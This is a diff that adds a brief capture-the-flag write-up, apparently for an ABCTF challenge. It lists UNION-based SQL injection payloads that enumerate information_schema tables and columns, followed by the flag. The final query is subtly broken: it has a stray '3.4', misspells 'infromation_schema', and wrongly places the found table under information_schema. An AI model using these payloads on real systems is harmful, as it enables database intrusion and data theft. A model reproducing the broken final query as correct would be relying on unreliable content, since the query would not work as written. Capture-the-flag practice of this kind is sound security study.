@@ -1,0 +1,9 @@
+Enter the following commands
+1 UNION SELECT table_name,2,3,4 FROM information_schema.tables scroll down to find 
+w0w_y0u_f0und_m3
+again enter 
+1 UNION SELECT column_name,2,3,4 FROM information_schema.columns scroll down to find
+f0und_m3
+Now put the findings into the command
+1 UNION SELECT f0und_m3,2,3.4 FROM infromation_schema.w0w_y0u_f0und_m3 and submit to find the flag
+flag abctf{uni0n_1s_4_gr34t_c0mm4nd}
